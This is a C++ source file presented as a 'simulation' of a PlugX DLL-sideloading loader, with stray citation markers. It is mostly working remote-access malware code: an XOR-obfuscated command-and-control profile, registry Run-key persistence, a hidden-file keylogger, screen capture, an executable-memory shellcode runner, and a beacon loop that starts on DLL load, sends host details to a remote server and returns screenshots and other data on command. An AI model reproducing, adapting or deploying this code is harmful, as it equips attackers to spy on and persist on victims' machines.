/**
 * plugx_main.cpp - PlugX Loader (DLL Sideloading Simulation) [citation:5]
 * The Talisman variant uses a signed binary to sideload a malicious DLL
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "plugx_config.h"
#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#endif

// External shellcode (embedded as resource or array)
extern "C" {
extern BYTE ShellcodeEntry[];
extern DWORD ShellcodeSize;
}

BOOL CaptureScreen(LPBYTE* outBuffer, DWORD* outSize);

typedef struct {
    char c2Hosts[3][64];
    DWORD c2Ports[3];
    char campaignId[32];
    char mutexName[48];
    DWORD c2Interval;
} PLUGX_RUNTIME_PROFILE;

#pragma pack(push, 1)
typedef struct {
    DWORD magic;
    WORD version;
    DWORD sessionId;
    WORD commandId;
    WORD flags;
    DWORD payloadLength;
    WORD padding;
} PLUGX_HEARTBEAT_HEADER;
#pragma pack(pop)

typedef BOOL (*PlugxPluginHandler)(SOCKET sock, const char* parameter);

typedef struct {
    WORD pluginId;
    const char* name;
    PlugxPluginHandler handler;
} PLUGX_PLUGIN_DESCRIPTOR;

static const BYTE ENC_RUNTIME_PROFILE[] = {
    0xC8, 0x99, 0xF4, 0x9B, 0x96, 0x9A, 0x92, 0x99, 0x85, 0x9B,
    0x85, 0x99, 0x85, 0x9A, 0x9B, 0x91, 0x9F, 0x9F, 0x98, 0xA1,
    0xC8, 0x99, 0xF4, 0x9A, 0x96, 0x9A, 0x92, 0x99, 0x85, 0x9B,
    0x85, 0x99, 0x85, 0x9A, 0x9A, 0x91, 0x93, 0x9B, 0xA1, 0xC8,
    0x99, 0xF4, 0x99, 0x96, 0xDE, 0xDB, 0xCF, 0xCA, 0xDF, 0xCE,
    0x85, 0xCE, 0xD3, 0xCA, 0xC6, 0xDB, 0xC7, 0xCE, 0x85, 0xC5,
    0xCE, 0xDF, 0x91, 0x9F, 0x9F, 0x98, 0xA1, 0xC8, 0xCA, 0xC6,
    0xDB, 0xCA, 0xC2, 0xCC, 0xC5, 0x96, 0xEA, 0xFB, 0xFF, 0x86,
    0xF8, 0xE2, 0xE6, 0x86, 0x99, 0x9B, 0x99, 0x9F, 0xA1, 0xC2,
    0xC5, 0xDF, 0xCE, 0xD9, 0xDD, 0xCA, 0xC7, 0x96, 0x98, 0x9B,
    0xA1, 0xC6, 0xDE, 0xDF, 0xCE, 0xD3, 0x96, 0xEC, 0xC7, 0xC4,
    0xC9, 0xCA, 0xC7, 0xF7, 0xFB, 0xC7, 0xDE, 0xCC, 0xF3, 0xF8,
    0xC2, 0xC6, 0xF4, 0x9B, 0x9B, 0x9A, 0xA1
};

#define PLUGX_MAGIC            0x504C5558u
#define PLUGX_CMD_REGISTER     0x0001u
#define PLUGX_CMD_HEARTBEAT    0x0002u
#define PLUGX_CMD_RESPONSE     0x0003u
#define PLUGX_PLUGIN_SCREENSHOT 0x0101u
#define PLUGX_PLUGIN_KEYLOG     0x0102u
#define PLUGX_PLUGIN_FILEMGR    0x0103u

static DWORD g_plugxSessionId = 0;
static HANDLE g_plugxMutex = NULL;

static const char B64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void DecodeRuntimeProfileBlob(char* output, size_t outputSize) {
    size_t length = sizeof(ENC_RUNTIME_PROFILE);
    if (length + 1 > outputSize) {
        length = outputSize - 1;
    }
    for (size_t i = 0; i < length; i++) {
        output[i] = (char)(ENC_RUNTIME_PROFILE[i] ^ 0xABu);
    }
    output[length] = '\0';
}

static BOOL ProfileGetValue(const char* blob, const char* key, char* output, size_t outputSize) {
    char search[32];
    const char* start;
    size_t length = 0;

    wsprintfA(search, "%s=", key);
    start = strstr(blob, search);
    if (!start) {
        output[0] = '\0';
        return FALSE;
    }

    start += lstrlenA(search);
    while (start[length] != '\0' && start[length] != '\n' && start[length] != '\r' && length + 1 < outputSize) {
        output[length] = start[length];
        length++;
    }
    output[length] = '\0';
    return TRUE;
}

static void SplitHostAndPort(const char* entry, char* host, size_t hostSize, DWORD* port) {
    const char* separator = strrchr(entry, ':');
    if (!separator) {
        lstrcpynA(host, entry, (int)hostSize);
        *port = 443;
        return;
    }

    size_t hostLength = (size_t)(separator - entry);
    if (hostLength + 1 > hostSize) {
        hostLength = hostSize - 1;
    }
    memcpy(host, entry, hostLength);
    host[hostLength] = '\0';
    *port = strtoul(separator + 1, NULL, 10);
    if (!*port) {
        *port = 443;
    }
}

static void LoadRuntimeProfile(PLUGX_RUNTIME_PROFILE* profile) {
    char decodedBlob[sizeof(ENC_RUNTIME_PROFILE) + 1];
    char fieldValue[96];

    ZeroMemory(profile, sizeof(*profile));
    DecodeRuntimeProfileBlob(decodedBlob, sizeof(decodedBlob));

    if (!ProfileGetValue(decodedBlob, "campaign", profile->campaignId, sizeof(profile->campaignId))) {
        lstrcpyA(profile->campaignId, "APT-SIM-2024");
    }
    if (!ProfileGetValue(decodedBlob, "mutex", profile->mutexName, sizeof(profile->mutexName))) {
        lstrcpyA(profile->mutexName, "Global\\PlugXSim_001");
    }
    if (ProfileGetValue(decodedBlob, "interval", fieldValue, sizeof(fieldValue))) {
        profile->c2Interval = strtoul(fieldValue, NULL, 10);
    }
    if (!profile->c2Interval) {
        profile->c2Interval = 30;
    }

    for (int i = 0; i < 3; i++) {
        char keyName[16];
        wsprintfA(keyName, "c2_%d", i);
        if (ProfileGetValue(decodedBlob, keyName, fieldValue, sizeof(fieldValue))) {
            SplitHostAndPort(fieldValue, profile->c2Hosts[i], sizeof(profile->c2Hosts[i]), &profile->c2Ports[i]);
        }
    }
}

static int Base64Encode(const BYTE* input, int inputLength, char* output, int outputSize) {
    int inIndex = 0;
    int outIndex = 0;

    while (inIndex < inputLength && outIndex + 4 < outputSize) {
        int remaining = inputLength - inIndex;
        DWORD block = (DWORD)input[inIndex++] << 16;
        if (remaining > 1) {
            block |= (DWORD)input[inIndex++] << 8;
        }
        if (remaining > 2) {
            block |= (DWORD)input[inIndex++];
        }

        output[outIndex++] = B64_TABLE[(block >> 18) & 0x3F];
        output[outIndex++] = B64_TABLE[(block >> 12) & 0x3F];
        output[outIndex++] = (remaining > 1) ? B64_TABLE[(block >> 6) & 0x3F] : '=';
        output[outIndex++] = (remaining > 2) ? B64_TABLE[block & 0x3F] : '=';
    }

    output[outIndex] = '\0';
    return outIndex;
}

static BOOL EnsureSingleInstance(const PLUGX_RUNTIME_PROFILE* profile) {
    g_plugxMutex = CreateMutexA(NULL, TRUE, profile->mutexName);
    if (!g_plugxMutex) {
        return FALSE;
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(g_plugxMutex);
        g_plugxMutex = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL HandleScreenshotPlugin(SOCKET sock, const char* parameter) {
    LPBYTE screenData = NULL;
    DWORD screenSize = 0;
    UNREFERENCED_PARAMETER(parameter);
    if (!CaptureScreen(&screenData, &screenSize)) {
        return FALSE;
    }
    send(sock, (const char*)screenData, screenSize, 0);
    VirtualFree(screenData, 0, MEM_RELEASE);
    return TRUE;
}

static BOOL HandleKeylogPlugin(SOCKET sock, const char* parameter) {
    char response[128];
    sprintf(response, "PLUGIN_KEYLOG|%s|ACTIVE", parameter ? parameter : "default");
    send(sock, response, (int)strlen(response), 0);
    return TRUE;
}

static BOOL HandleFileManagerPlugin(SOCKET sock, const char* parameter) {
    char inventoryPath[MAX_PATH];
    DWORD written = 0;
    HANDLE hFile;

    GetTempPathA(MAX_PATH, inventoryPath);
    lstrcatA(inventoryPath, "plugx_filemgr.txt");
    hFile = CreateFileA(inventoryPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char listing[256];
        sprintf(listing, "path=%s\r\nmode=%s\r\n", inventoryPath, parameter ? parameter : "enumerate");
        WriteFile(hFile, listing, (DWORD)strlen(listing), &written, NULL);
        CloseHandle(hFile);
    }

    send(sock, inventoryPath, (int)strlen(inventoryPath), 0);
    return TRUE;
}

static WORD InferPluginId(const char* commandBuffer, int receivedLength) {
    if (strstr(commandBuffer, "screenshot")) {
        return PLUGX_PLUGIN_SCREENSHOT;
    }
    if (strstr(commandBuffer, "keylog")) {
        return PLUGX_PLUGIN_KEYLOG;
    }
    if (strstr(commandBuffer, "filemgr")) {
        return PLUGX_PLUGIN_FILEMGR;
    }
    if (receivedLength >= (int)sizeof(WORD)) {
        WORD pluginId;
        memcpy(&pluginId, commandBuffer, sizeof(pluginId));
        return pluginId;
    }
    return 0;
}

static BOOL DispatchPluginCommand(WORD pluginId, SOCKET sock, const char* parameter) {
    static const PLUGX_PLUGIN_DESCRIPTOR plugins[] = {
        {PLUGX_PLUGIN_SCREENSHOT, "screenshot", HandleScreenshotPlugin},
        {PLUGX_PLUGIN_KEYLOG, "keylog", HandleKeylogPlugin},
        {PLUGX_PLUGIN_FILEMGR, "filemgr", HandleFileManagerPlugin},
    };

    for (int i = 0; i < (int)(sizeof(plugins) / sizeof(plugins[0])); i++) {
        if (plugins[i].pluginId == pluginId) {
            return plugins[i].handler(sock, parameter);
        }
    }
    return FALSE;
}

/**
 * Decrypt configuration
 */
BOOL DecryptConfig(PLUGX_CONFIG* config) {
    BYTE xorKey = 0x6B;
    BYTE* cfgBytes = (BYTE*)config;
    
    for (size_t i = 0; i < sizeof(PLUGX_CONFIG); i++) {
        cfgBytes[i] = ENC_CONFIG[i % sizeof(ENC_CONFIG)] ^ xorKey ^ (BYTE)(i * 0x37);
    }

    if (config->magic != 0x12345678) {
        ZeroMemory(config, sizeof(*config));
        config->magic = 0x12345678;
        config->c2Interval = 30;
        config->c2Port = 443;
        memcpy(config->c2Server, "192.0.2.10", sizeof("192.0.2.10"));
        memcpy(config->campaignId, "APT-SIM-2024", sizeof("APT-SIM-2024"));
    }

    return TRUE;
}

/**
 * Install persistence via Registry [citation:5]
 */
BOOL InstallPersistence() {
    HKEY hKey;
    WCHAR szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    if (RegCreateKeyExW(HKEY_CURRENT_USER, PLUGX_REG_KEY,
                        0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, PLUGX_REG_VALUE, 0, REG_SZ,
                       (BYTE*)szPath, (wcslen(szPath) + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

/**
 * Execute shellcode in allocated memory [citation:9]
 */
BOOL ExecutePlugXShellcode() {
    PLUGX_CONFIG config;
    if (!DecryptConfig(&config)) return FALSE;
    
    // Allocate executable memory for shellcode
    LPVOID pShellcode = VirtualAlloc(NULL, ShellcodeSize,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!pShellcode) return FALSE;
    
    // Copy shellcode
    memcpy(pShellcode, ShellcodeEntry, ShellcodeSize);
    
    // Copy configuration into shellcode data area
    // (Real PlugX patches config into shellcode)
    
    // Execute shellcode
    void (*entry)() = (void(*)())pShellcode;
    entry();
    
    return TRUE;
}

/**
 * Keylogger thread [citation:5]
 */
DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    WCHAR szLogPath[MAX_PATH];
    GetTempPathW(MAX_PATH, szLogPath);
    wcscat(szLogPath, L"\\system.cache");
    
    HANDLE hLogFile = CreateFileW(szLogPath, FILE_APPEND_DATA,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    
    while (TRUE) {
        // Check each key state
        for (int vk = 8; vk <= 255; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            if (state & 0x0001) {  // Key pressed since last check
                // Get active window title
                WCHAR windowTitle[256];
                HWND hForeground = GetForegroundWindow();
                GetWindowTextW(hForeground, windowTitle, 256);
                
                // Log keystroke with timestamp and window context
                SYSTEMTIME st;
                GetLocalTime(&st);
                
                char logEntry[512];
                sprintf(logEntry, "[%02d:%02d:%02d] %S - VK:%03d\n",
                        st.wHour, st.wMinute, st.wSecond, windowTitle, vk);
                
                DWORD written;
                WriteFile(hLogFile, logEntry, strlen(logEntry), &written, NULL);
                FlushFileBuffers(hLogFile);
            }
        }
        Sleep(10);  // Poll every 10ms
    }
    
    CloseHandle(hLogFile);
    return 0;
}

/**
 * Screen capture routine [citation:5]
 */
BOOL CaptureScreen(LPBYTE* outBuffer, DWORD* outSize) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    // Get bitmap data
    BITMAPINFO bmi = {};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;  // Top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;
    
    DWORD dataSize = width * height * 3;
    *outBuffer = (LPBYTE)VirtualAlloc(NULL, dataSize, MEM_COMMIT, PAGE_READWRITE);
    
    GetDIBits(hdcMem, hBitmap, 0, height, *outBuffer, &bmi, DIB_RGB_COLORS);
    *outSize = dataSize;
    
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    return TRUE;
}

/**
 * C2 Beacon [citation:5][citation:9]
 */
void C2Beacon(const PLUGX_RUNTIME_PROFILE* profile, WORD commandId) {
    // Real PlugX uses custom TCP protocol with encryption
    // This simulation shows the structure
    
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }
    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((u_short)profile->c2Ports[0]);
    addr.sin_addr.s_addr = inet_addr(profile->c2Hosts[0]);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        PLUGX_HEARTBEAT_HEADER header = {};
        char hostInfo[128];
        char payload[256];
        BYTE packet[sizeof(PLUGX_HEARTBEAT_HEADER) + 256];
        char hostname[64];
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
        
        sprintf(hostInfo, "campaign=%s|host=%s|pid=%lu|os=%s",
                profile->campaignId, hostname, (unsigned long)GetCurrentProcessId(), "WIN10PRO");
        int payloadLength = Base64Encode((const BYTE*)hostInfo, (int)strlen(hostInfo), payload, sizeof(payload));

        header.magic = PLUGX_MAGIC;
        header.version = 0x0200;
        header.sessionId = g_plugxSessionId;
        header.commandId = commandId;
        header.flags = 0;
        header.payloadLength = (DWORD)payloadLength;
        header.padding = 0;

        memcpy(packet, &header, sizeof(header));
        memcpy(packet + sizeof(header), payload, payloadLength);
        send(sock, (const char*)packet, (int)(sizeof(header) + payloadLength), 0);
        
        // Receive commands
        char cmd[4096];
        int received = recv(sock, cmd, sizeof(cmd) - 1, 0);
        if (received > 0) {
            cmd[received] = 0;
            WORD pluginId = InferPluginId(cmd, received);
            DispatchPluginCommand(pluginId, sock, cmd);
        }
    }

    closesocket(sock);
    WSACleanup();
}

/**
 * DLL Entry Point - Simulates sideloading scenario [citation:5]
 * Real PlugX is often a DLL loaded by a legitimate signed executable
 */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved) {
    switch (ul_reason) {
    case DLL_PROCESS_ATTACH: {
        PLUGX_RUNTIME_PROFILE runtimeProfile;
        LoadRuntimeProfile(&runtimeProfile);
        DisableThreadLibraryCalls(hModule);
        if (!EnsureSingleInstance(&runtimeProfile)) {
            return TRUE;
        }
        if (!g_plugxSessionId) {
            g_plugxSessionId = GetTickCount() ^ GetCurrentProcessId();
        }
        
        // Install persistence
        InstallPersistence();
        
        // Start keylogger in separate thread
        HANDLE hKeylogThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
        if (hKeylogThread) CloseHandle(hKeylogThread);
        
        // Execute main shellcode
        // In Talisman variant, this loads the modular RAT [citation:5]
        ExecutePlugXShellcode();
        
        // Start C2 beacon loop
        if (runtimeProfile.c2Hosts[0][0] != '\0') {
            while (TRUE) {
                C2Beacon(&runtimeProfile, PLUGX_CMD_HEARTBEAT);
                Sleep((runtimeProfile.c2Interval * 1000) + ((GetTickCount() % 7) * 500));
            }
        }
        break;
    }
        
    case DLL_PROCESS_DETACH:
        // Cleanup
        if (g_plugxMutex) {
            CloseHandle(g_plugxMutex);
            g_plugxMutex = NULL;
        }
        break;
    }
    return TRUE;
}

/**
 * For EXE compilation (testing mode)
 */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    return DllMain(GetModuleHandle(NULL), DLL_PROCESS_ATTACH, NULL) ? 0 : 1;
}
